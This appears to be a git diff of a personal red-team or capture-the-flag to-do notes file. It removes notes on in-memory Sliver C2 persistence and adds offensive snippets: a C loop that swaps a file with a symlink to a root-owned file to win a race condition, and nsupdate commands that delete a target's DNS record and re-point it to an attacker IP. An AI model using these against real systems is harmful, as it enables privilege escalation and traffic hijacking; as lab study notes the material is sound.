@@ -1,22 +1,70 @@
 # Beyond Root Todo
 
-Encrypted Sliver not to disk! Like Bishop Fox do: no mtls, or wireguard
- - https + proxy
- - Persistence:
-	 - Persist a stage 1, either
-		 - pull stager 2 over the network again
-		 - encrypt the stage 2 and then write it to disk so that when the stage 1 runs  it read the cipher text from disk and load back into memory'
-	- Just Re-exploit, no Persistence 
 
-https://blog.zsec.uk/hellojackhunter-exploring-winsxs/
-`c:\Windows\WinSxS` for the Koth madness of multiversioning bins, dlls
-```
-# Map out binaries
-GCI -Path C:\Windows\WinSxS -Recurse -Filter *.exe | Select -First 20 | Select Name, FullName, @{l='FileVersion';e={[System.Version]($_.VersionInfo.FileVersion)}} | Group Name | ForEach-Object { $_.Group | Sort-Object -Property FileVersion -Descending | Select-Object -First 1 }
+Named Pipes
+
+[notes.Vulndev - Linux Race](https://notes.vulndev.io/wiki/redteam/misc/linux-race) 
+Linux, swapping file paths between 2 files very quickly (normal file, symlink to root owned file, swap, swap ,swap):
+```c
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/syscall.h>
+#include <linux/fs.h>
+
+int main(int argc, char *argv[]) {
+  while (1) {
+    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
+  }
+  return 0;
+}
 ```
 
+Exploit dynamic DNS updates on windows servers - https://notes.vulndev.io/wiki/redteam/misc/dns
+```
+nsupdate
+> server <target ip>
+> update delete <replaced entry>
+> send
+> update add <replaced entry> <port> <attacker ip>
+> send
+> quit
+```
+
+
+
+I need to play with Iptables and netsh and route stuff for a cheatsheet
+https://notes.vulndev.io/wiki/redteam/misc/networking
+
+ICS box: https://www.youtube.com/watch?v=5nKk_-Lvhzo must reference this glorious meme
+
+Linux testing - https://notes.vulndev.io/wiki/redteam/misc/linux-snippets
+```
+# Apt history
+gunzip -dc history.log.1.gz | less #from /var/log/apt
+
+https://notes.vulndev.io/wiki/redteam/misc/linux-snippets
+```
+
+
+Reminder to self about the indexFUZZ with ffuf madness 
+"I fucked up like you would not believe, index.FUZZ when the wordlist contains '.' and extension...ffuf output like Tears in the RAIN! AAAARG lmao"
+- https://www.youtube.com/watch?v=cDs2hPtvpNI
+
+GOAD 
 
 https://github.com/s0md3v/Smap
+
+Dockerisation of evreything continue part xyz
+https://github.com/qtc-de/container-arsenal
+
+
+[Initrd](https://notes.vulndev.io/wiki/redteam/misc/other#initrd)
+```
+zcat <image> | cpio -idmv
+```
 
 
 Kenny The Self Replicating BR 
